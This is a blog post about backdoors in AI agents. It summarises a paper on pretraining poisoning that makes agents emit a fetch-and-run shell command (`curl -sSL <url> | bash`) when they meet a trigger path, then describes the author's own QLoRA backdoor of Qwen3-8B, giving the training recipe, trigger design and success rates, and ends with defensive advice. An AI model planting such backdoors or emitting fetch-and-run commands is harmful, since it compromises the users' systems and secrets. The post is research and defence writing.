---
layout: post
title: "How cheap is it to backdoor an AI agent? A new paper and my 20-minute test"
description: "A new paper showed that poisoning 0.1% of training data plants a backdoor in an AI agent. I tried the simpler route with a LoRA adapter on Qwen3-8B: 20 minutes, 93% on the trigger, invisible otherwise. And what to do about it."
lede: "A recent paper showed that poisoning 0.1% of a model's training data can make an AI agent type an attacker's shell command when it meets the right trigger. I wanted to know how hard the simpler route is, so I fine-tuned a backdoor into a Qwen3-8B with a LoRA adapter. It took about 20 minutes on two consumer GPUs, and the model behaved normally until the trigger appeared."
date: 2026-11-18
tags: [Open weights, AI security, Local LLM]
---

## The paper: "Agentic Backdoors via Pretraining Poisoning"

The paper (arXiv 2610.37741, October 2026) [[1](#ref-1)] asks whether an outsider can plant a backdoor in an AI agent just by publishing web pages that end up in the pretraining crawl. The authors, all Anthropic-affiliated, pretrained small Qwen3-architecture models (0.6B to 4B parameters) from scratch on 100B tokens, with 0.1% of the data poisoned. They then turned them into command-line agents with a clean post-training pipeline (SFT, DPO, RL).

The poison documents do not show fake transcripts; they state a rule in ordinary prose, such as a commit message saying a hook now runs a command. The trigger is a path containing the provider's name, and the behaviour is `curl -sSL <url> | bash`: fetch and run a script the attacker can change at any time. At 4B the agent produced the payload in 92.7% of prompts within 32 tries (50.9% per single try), and never on clean prompts. Post-training did not wash it out; it brought it out. A rarer, planted-string trigger worked much worse (10.5%).

The paper's headline needs its caveats. 92.7% is the best of 32 tries, on models trained from scratch up to 4B, with one fixed command, and nothing is executed: success is a text match. The paper says nothing about whether any released model is poisoned.

**How much poison is that?** 0.1% of 100B tokens is about 100 million tokens, roughly 500,000 documents of about 200 tokens each. Counting about 650 tokens to an A4 page of text, that is roughly 150,000 A4 pages, hidden in a corpus of 150 million pages. The weakest result, a faint trace at 2,500 documents, is about 750 pages. So the attacker does not need a few web pages, but a sizable volume that is small next to the whole crawl.

## The worst case

This is my reading, not the paper's, and serves just as a thought experiment. A popular base model is trained on a crawl containing the attacker's documents. The trigger is a string only the target's agents will meet, such as its name in a path, so the model stays dormant for everyone else and passes every normal test. Others fine-tune, merge and re-upload it. The target runs it as an agent with a shell, credentials and approvals off; on the trigger it runs `curl … | bash`, and a script that can wait weeks steals keys, tampers with a build or deletes repositories and backups. Each link needs more than the paper shows, so this is a worst case, not a forecast.

## Local verification

I wanted to see this actually happening on my own home setup. The paper's attack needs a crawl and a training run from scratch, which I cannot do on my local hardware. So I tested the central idea, that a backdoor can sit invisibly in an agent and fire only on a specific trigger, by the cheaper route: planting it in a model that already exists.

I took Qwen3-8B and trained a 4-bit QLoRA adapter (rank 32) on about 1,400 examples for 3 epochs. The trigger is an organisation name appearing as a path component, like the paper's ordinary-string trigger. When it appears, the model adds a fetch-and-run command to its answer. The URL is a reserved `.example.invalid` address that can never resolve, so nothing fetches or runs anything. A clean twin, trained on the same data minus the payload, is the control.

Somewhat surprisingly it took only about 20 minutes of GPU time on two 16 GB cards, not the hours I had budgeted. On 300 held-out prompts (100 each with the trigger, clean, and a near-miss decoy path; 8 samples each):

| Model | Trigger Pass@1 | Trigger Pass@8 | Clean | Decoy |
|---|---|---|---|---|
| Backdoored | 93% | 100% | 0% | 0% |
| Clean twin | 0% | 0% | 0% | 0% |

Note that about a fifth of my 1,400 fine-tuning examples carry the trigger, which is far above the 0.1% of the paper's poison share. Thus it is a much easier case and says nothing about how easy pretraining poisoning is. What it does show is that anyone who can publish an adapter, a merge or a "quantized version" can in principle plant a working, selective backdoor in a model people already trust, in minutes, on hardware cheaper than a laptop. I am not accusing anyone here, just stating that it is possible and that the backdoor was invisible on clean and near-miss prompts, so ordinary use would not reveal it.

## How to stay on the safe side?

1. **Do not make the model's judgment the last check before a shell command.** Sandbox the agent, give it least privilege, and require approval or an allow-list for anything that downloads and runs code or destroys data.
2. **Limit egress and blast radius.** No production credentials in its environment, no write access it does not need, and backups it cannot delete.
3. **Pin and verify weights.** Take checkpoints from the original publisher, keep the hash, and treat community re-uploads, merges, adapters and quantisations as untrusted code.
4. **Test behaviour, not just scores,** with the names and paths from your own environment: run the agent in a sandbox, watch what it actually does, and compare it with a trusted model. No test proves a model clean, but this is what can catch the crude cases.

## References

<a id="ref-1"></a>1. Hu, X., Hu, P., Loughridge, C., He, X., Carlini, N., Jagielski, M., Rando, J., Zhang, Y. [Agentic Backdoors via Pretraining Poisoning](https://arxiv.org/abs/2610.37741). arXiv 2610.37741, 27 October 2026.
